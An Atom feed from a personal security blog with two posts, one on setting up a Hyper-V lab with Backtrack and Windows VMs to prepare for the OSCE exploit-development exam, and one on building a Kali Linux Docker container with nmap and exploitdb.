<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-05-29T17:45:03+01:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Bovine Hero Blog</title><subtitle>Bovine Hero's Security Blog</subtitle><entry><title type="html">Preparing for OSCE</title><link href="http://localhost:4000/exploitdev/Preparing-for-OSCE.html" rel="alternate" type="text/html" title="Preparing for OSCE" /><published>2020-05-29T00:00:00+01:00</published><updated>2020-05-29T00:00:00+01:00</updated><id>http://localhost:4000/exploitdev/Preparing%20for%20OSCE</id><content type="html" xml:base="http://localhost:4000/exploitdev/Preparing-for-OSCE.html">&lt;p&gt;A while back I got my OSCP, did some Hack the Box and learned some custom exploits. After smashing through the CTP coursework I thought I was hot shit and booked my OSCE exam… I failed. After a break I decided to prepare for it again, this post I’m going to set up my training Lab for round 2.&lt;/p&gt;

&lt;h2 id=&quot;osce-vs-oscp-in-a-nutshell&quot;&gt;OSCE vs OSCP in a nutshell.&lt;/h2&gt;

&lt;p&gt;There are loads of reviews for OSCP it is a great course. It looks at a broad scope of assessment techniques and gives students a strong foundation to build on, OSCE is more focused and is often touted as a level up from OSCP as it covers more advanced techniques.&lt;/p&gt;

&lt;p&gt;While I certainly found the OSCE exam more difficult (48 hours for OSCE vs 24 in OSCP) it isn’t really a level up, more a specialization in exploit development. Much like medical doctors study medicine not every doctor will specialize in surgery some may look to practice anesthesiology or oncology instead. OSCE is not the same as OSCP, it primarily tests your ability to develop black box exploits (on windows) all of the other stuff takes a back seat. If you really liked the Buffer Overflow content in the PWK course, then this is a natural fit. The big difference is that in OSCE you will need to develop some tooling if you want to pass, passing the exam in manual mode is very difficult.&lt;/p&gt;

&lt;p&gt;Many people feel the course is dated, while at time of writing the content IS old it does cover legitimate techniques to build on. I’m a big fan of walking before running and learning the legacy stuff is a great way to build foundations in an area. I really took a lot out of the course which has helped me become a better at my work. While I’d love to see some modernization in the content the course was definitely a worthwhile experience.&lt;/p&gt;

&lt;h2 id=&quot;the-lab-setup&quot;&gt;The Lab Setup&lt;/h2&gt;

&lt;h3 id=&quot;vms-for-testing&quot;&gt;VMs for Testing&lt;/h3&gt;
&lt;p&gt;The Cracking the Perimeter (CTP) course is pretty old, it relies on Windows XP and Vista to develop the exploits and Backtrack instead of Kali. This comes with a few challenges, in 2020 legitimate copies of both XP and Vista are very difficult to get a hold of. Windows 7 &lt;em&gt;is&lt;/em&gt; still available if you have a product key from &lt;a href=&quot;https://www.microsoft.com/en-gb/software-download/windows7&quot;&gt;Microsoft&lt;/a&gt; which I found is a suitable substitute for Vista. XP is a little harder to get, while not 100% necessary for practice it does make an appearance in the course. XP’s (really, really) legacy browsers offer plenty of exploit opportunities to practice on. Just make sure you get the &lt;strong&gt;x86&lt;/strong&gt; version, &lt;strong&gt;x64&lt;/strong&gt; architecture OS are too modern and makes the learning more difficult.&lt;/p&gt;

&lt;p&gt;Building images is a pretty standard task in HyperV and if you can get a hold of XP and Win7 Pro iso files, you can even enable remote desktop. I covered how set up virtual hardware for a Kali VM in this &lt;a href=&quot;/kalisetup/Kali-Linux-HyperV-Style.html&quot;&gt;post&lt;/a&gt;. There is little difference in creating the ‘hardware’ components but for x86 guest VMs need to be GEN1 and I have specified the following hardware specs:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;1024 - 4096 MB RAM (more than 4GB is wasteful)&lt;/li&gt;
  &lt;li&gt;128 GB HDD (gives a base install plus a little room for programs.)&lt;/li&gt;
  &lt;li&gt;1 Network Adapter (I had to use a Legacy Adapter for XP)&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;For the windows VMs once the base Windows OS is installed make sure that updates are disabled and that the network adapter is pointed to an external network switch. This will allow easy downloads for tools. Once everything is installed remapping the VM’s network Adapter to point internally will help stop any rogue code getting in or out.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;make sure to disable secure boot options!&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;When you sign up for CTP Offensive security give you a custom &lt;a href=&quot;http://downloads.kali.org/BT5R3-GNOME-VM-32.7z&quot;&gt;Backtrack image&lt;/a&gt; for the course. While the course can be completed with Kali the Metasploit version in Kali is more automated than the one in Backtrack. When on engagements this is obviously better it disadvantages learning as some of the code execution is obfuscated in encoding. Forgoing Backtrack isn’t a deal breaker, but really helps with the course and so it is worthwhile creating a VM for it.&lt;/p&gt;

&lt;p&gt;The image supplied is optimized for VMWare Workstation/Player, but I can’t use that as I’m on HyperV so it needs converted. Luckily &lt;a href=&quot;https://www.microsoft.com/en-gb/download/details.aspx?id=42497&quot;&gt;Microsoft Virtual Machine Converter&lt;/a&gt; comes with a handy set of tools that can do this for me. The GUI version isn’t really optimized for VMWare Workstation/Player it is best with a VMWare ESX server, I don’t have this but can leverage the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MvmcCmdlet.psd1&lt;/code&gt; module in powershell. Once I extract the BT5R3-GNOME-VM-32 machine via 7zip All I need to do is import the module and execute conversion commands to get a compatible VHD disk:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;nf&quot;&gt;Import-Module&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;C:\Program Files\Microsoft Virtual Machine Converter\MvmcCmdlet.psd1&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ConvertTo-MvmcVirtualHardDisk&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-SourceLiteralPath&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;\BT5R3-GNOME-VM-32.vmdk&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-DestinationLiteralPath&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;\BT5R3-GNOME-VM-32&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-VhdType&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;DynamicHardDisk&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-VhdFormat&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Vhd&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;And it works:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;nf&quot;&gt;Destination&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;                                &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Source&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;-----------&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;                                &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;------&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;K:\BT5R3-GNOME-VM-32\BT5R3-GNOME-VM-32.vhd&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;\BT5R3-GNOME-VM-32.vmdk&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Specifying the same hardware requirements as the Windows machines I need only point the Virtual hard disk to point to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BT5R3-GNOME-VM-32.vhd&lt;/code&gt; file and power it on.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;\assets\images\ExploitDev\posts\BT.png&quot; alt=&quot;BT.png&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;software-for-training&quot;&gt;Software for Training&lt;/h3&gt;

&lt;p&gt;First things first, while Backtrack and Kali come with everything you might need to &lt;em&gt;exploit&lt;/em&gt; a target they don’t have all the tools we need to develop the attack vector. As the exploit development process is against windows targets we need to set up a target app and development environment on our windows machines.&lt;/p&gt;

&lt;h3 id=&quot;windows&quot;&gt;Windows&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;strong&gt;Firefox:&lt;/strong&gt; because I’m going to be scraping the open web for tools, first thing I need is a safe(ish) browser, using legacy IE can be dangerous so a &lt;a href=&quot;https://www.mozilla.org/en-GB/firefox/new/&quot;&gt;modern version&lt;/a&gt; of firefox helps.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Git for Windows:&lt;/strong&gt; I need some way to manage the automation code and tooling that I’ll be developing. Setting up a private git repo and pulling it down is very helpful. These days Linux ships with this as standard but I need to get it for windows. I like Git for Windows available &lt;a href=&quot;https://git-scm.com/download/win&quot;&gt;here&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;VulnServer:&lt;/strong&gt; For the target app &lt;a href=&quot;https://github.com/stephenbradshaw/vulnserver&quot;&gt;Vulnserver&lt;/a&gt; offers a lot of bang for your buck, if you can comfortably beat all the ways in here you are ready for CTP.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Immunity Debugger:&lt;/strong&gt; in CTP &lt;a href=&quot;http://www.ollydbg.de/&quot;&gt;OllyDB&lt;/a&gt; is the Debugger of choice, but if you’ve done OSCP then &lt;a href=&quot;https://www.immunityinc.com/products/debugger/&quot;&gt;Immunity Debugger&lt;/a&gt; is perhaps more familiar and offers a lot of extensibility with python. Its only downside is that it is not available in py3 (yet?!?)&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;FUZZER&lt;/strong&gt; Spike&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Wireshark:&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;LordPE:&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Anti Virus:&lt;/strong&gt; AVG Anti Virus&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;nasm:&lt;/strong&gt; use backtrack / kali for this&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;msfvenom:&lt;/strong&gt; use backtrack / kali for this&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;https://www.youtube.com/watch?v=0n3Li63PwnQ&amp;amp;t=30s&lt;/p&gt;

&lt;h2 id=&quot;bible&quot;&gt;Bible&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;https://tulpa-security.com/2017/07/18…
    &lt;h2 id=&quot;reviews&quot;&gt;Reviews&lt;/h2&gt;
  &lt;/li&gt;
  &lt;li&gt;https://www.abatchy.com/2017/03/osce-…&lt;/li&gt;
  &lt;li&gt;https://jhalon.github.io/OSCE-Review/&lt;/li&gt;
  &lt;li&gt;https://netsec.ws/?p=517&lt;/li&gt;
  &lt;li&gt;https://sock-raw.org/blog/osce-review/&lt;/li&gt;
  &lt;li&gt;https://www.doyler.net/security-not-i…&lt;/li&gt;
  &lt;li&gt;https://coffeegist.com/security/my-os…&lt;/li&gt;
  &lt;li&gt;https://blog.own.sh/oscp-osce-oswp-re…&lt;/li&gt;
  &lt;li&gt;https://stacktrac3.co/osce-review-ctp…&lt;/li&gt;
  &lt;li&gt;https://medium.com/@david.valles/the-…
    &lt;h2 id=&quot;practice&quot;&gt;Practice&lt;/h2&gt;
  &lt;/li&gt;
  &lt;li&gt;Vulnserver
    &lt;ul&gt;
      &lt;li&gt;http://www.thegreycorner.com/2010/12/…&lt;/li&gt;
      &lt;li&gt;https://github.com/stephenbradshaw/vu…&lt;/li&gt;
      &lt;li&gt;https://h0mbre.github.io/LTER_SEH_Suc…&lt;/li&gt;
      &lt;li&gt;http://sh3llc0d3r.com/vulnserver-gmon…&lt;/li&gt;
      &lt;li&gt;https://purpl3f0xsec.tech/2019/09/10/…
        &lt;h2 id=&quot;subencoding&quot;&gt;Subencoding&lt;/h2&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;https://marcosvalle.github.io/re/expl…&lt;/li&gt;
  &lt;li&gt;http://vellosec.net/2018/08/carving-s…&lt;/li&gt;
&lt;/ul&gt;</content><author><name></name></author><category term="LabSetup" /><category term="HyperV" /><category term="ExploitDev" /><summary type="html">A while back I got my OSCP, did some Hack the Box and learned some custom exploits. After smashing through the CTP coursework I thought I was hot shit and booked my OSCE exam… I failed. After a break I decided to prepare for it again, this post I’m going to set up my training Lab for round 2.</summary></entry><entry><title type="html">Building a Kali Container</title><link href="http://localhost:4000/secdevops/Building-a-Kali-Container.html" rel="alternate" type="text/html" title="Building a Kali Container" /><published>2020-05-21T00:00:00+01:00</published><updated>2020-05-21T00:00:00+01:00</updated><id>http://localhost:4000/secdevops/Building-a-Kali-Container</id><content type="html" xml:base="http://localhost:4000/secdevops/Building-a-Kali-Container.html">&lt;p&gt;Now that I have Docker setup I’m going to build a PoC nmap container out of a base Kali image.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/secdevops/Setting-Up-Docker-on-Windows.html&quot;&gt;Last post&lt;/a&gt; I looked at setting up Docker and deploying a PoC demo of an Nginx server. This post I’m going to build a tool I can actually use.&lt;/p&gt;

&lt;h2 id=&quot;clearing-the-decks&quot;&gt;Clearing the Decks&lt;/h2&gt;

&lt;p&gt;First I check that I have no docker processes running:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;nf&quot;&gt;docker&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ps&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;I don’t:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Next I want to think about where I want to store my docker stuff. With docker running I right click on the icon on the taskbar to get to settings.&lt;/p&gt;

&lt;p&gt;In Resources I can specify a storage location to a more convenient one than the default:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;\assets\images\SecDevOps\posts\image-location.png&quot; alt=&quot;image-location.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And so that I can easily share resources between containers I specify a file share location as well:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;\assets\images\SecDevOps\posts\fileShare.png&quot; alt=&quot;fileShare.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After an &lt;strong&gt;Apply and Reset&lt;/strong&gt; the changes take place.&lt;/p&gt;

&lt;h2 id=&quot;getting-a-base-image&quot;&gt;Getting a Base Image&lt;/h2&gt;

&lt;p&gt;I want to start with an official Kali linux base, luckily Kali Linux have published images on &lt;a href=&quot;https://registry.hub.docker.com/u/kalilinux&quot;&gt;DockerHub&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Ordinarily I would kick off a pull of the remote image and run it interactively via the following commands:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;nf&quot;&gt;docker&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;pull&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;kalilinux/kali-rolling&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;docker&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;kalilinux/kali-rolling&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/bin/bash&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;This would let me quickly configure a bare bones Kali (shell only) image. While this is fast I’m lazy, if I have to do something more than twice I want to leverage some automation. So I’m going to use a Dockerfile to configure and set up set up my base image.
What is a Dockerfile? It is a simple configuration file which specifies the initial setup of a container.&lt;/p&gt;

&lt;p&gt;This has several advantages, but where it really shines for me is the ability to refer to this file for a base image and then build on it to create custom Kali builds for individual test cases. This simplifies deployments and reduces my workload, indeed in enterprise these files can be templated with variables and quickly scaled as needed.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;When you issue a docker build command, the current working directory is called the build context. By default, the Dockerfile is assumed to be located here, but you can specify a different location with the file flag (-f). Regardless of where the Dockerfile actually lives, all recursive contents of files and directories in the current directory are sent to the Docker daemon as the build context.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;First off I want to clean out all my stored images:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;nf&quot;&gt;docker&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rmi&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;docker&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;images&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-q&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--force&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Dockerfile&lt;/code&gt; contents:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-conf&quot; data-lang=&quot;conf&quot;&gt;&lt;span class=&quot;c&quot;&gt;# Kali Linux Base Image to start all Kali builds with
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kalilinux&lt;/span&gt;/&lt;span class=&quot;n&quot;&gt;kali&lt;/span&gt;-&lt;span class=&quot;n&quot;&gt;rolling&lt;/span&gt; 
&lt;span class=&quot;n&quot;&gt;LABEL&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Description&lt;/span&gt;=&lt;span class=&quot;s2&quot;&gt;&quot;Base Image to start all Kali builds with&quot;&lt;/span&gt; &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;If I go to the same directory as my Docker file I can kick off a build for an image and tag it as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;base&lt;/code&gt; with:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;nf&quot;&gt;docker&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;build&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;base&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;To get the following output&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;Sending build context to Docker daemon  2.048kB
Step 1/2 : FROM kalilinux/kali-rolling
 &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 461ce11a4bd9
Step 2/2 : LABEL &lt;span class=&quot;nv&quot;&gt;Description&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;base Image to start all Kali builds with&quot;&lt;/span&gt;
 &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Using cache
 &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 1777f73dd909
Successfully built 1777f73dd909
Successfully tagged base:latest
SECURITY WARNING: You are building a Docker image from Windows against a non-Windows Docker host. All files and directories added to build context will have &lt;span class=&quot;s1&quot;&gt;'-rwxr-xr-x'&lt;/span&gt; permissions. It is recommended to double check and reset permissions &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;sensitive files and directories.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;I can run the base image interactively in this command prompt in privileged mode:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;nf&quot;&gt;docker&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--privileged&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;base&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;bash&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;and perform some basic commands:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;root@bcbf347910d1:/# &lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;uname&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Linux bcbf347910d1 4.19.76-linuxkit &lt;span class=&quot;c&quot;&gt;#1 SMP Fri Apr 3 15:53:26 UTC 2020 x86_64 GNU/Linux&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;This is a pretty basic image it comes with very few tools by default and requires package installations to be of any real benefit for us, from here I’m free to customize the build manually. These changes only persist for the life of the container and if I want to persist them I will need to commit changes to the image in a separate shell on the host device.&lt;/p&gt;

&lt;p&gt;As I mentioned earlier, manual configurations are tiresome it is my preference to automate as much of this as possible. To do this we can leverage RUM, CMD and ENTRYPOINT commands.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;RUN executes command(s) in a new layer and creates a new image. E.g., it is often used for installing software packages. CMD sets default command and/or parameters, which can be overwritten from command line when docker container runs. ENTRYPOINT configures a container that will run as an executable. &lt;a href=&quot;https://goinbigdata.com/docker-run-vs-cmd-vs-entrypoint/&quot;&gt;source&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Below is an example of a dockerfile that will install nmap and exploitdb packages using RUN:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-conf&quot; data-lang=&quot;conf&quot;&gt;&lt;span class=&quot;c&quot;&gt;# Kali Linux base Image to start all Kali builds with
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kalilinux&lt;/span&gt;/&lt;span class=&quot;n&quot;&gt;kali&lt;/span&gt;-&lt;span class=&quot;n&quot;&gt;rolling&lt;/span&gt; 
&lt;span class=&quot;n&quot;&gt;LABEL&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Description&lt;/span&gt;=&lt;span class=&quot;s2&quot;&gt;&quot;base Image to start all Kali builds with&quot;&lt;/span&gt; 
&lt;span class=&quot;n&quot;&gt;RUN&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;apt&lt;/span&gt;-&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;update&lt;/span&gt; &amp;amp;&amp;amp; &lt;span class=&quot;n&quot;&gt;apt&lt;/span&gt;-&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt; -&lt;span class=&quot;n&quot;&gt;y&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;install&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nmap&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;exploitdb&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;This time when I rebuild my base image:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;nf&quot;&gt;docker&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;build&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;base&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;It pulls performs an install&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;Sending build context to Docker daemon  2.048kB
Step 1/3 : FROM kalilinux/kali-rolling
 &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 461ce11a4bd9
Step 2/3 : LABEL &lt;span class=&quot;nv&quot;&gt;Description&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;base Image to start all Kali builds with&quot;&lt;/span&gt;
 &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Using cache
 &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; cf572134723d
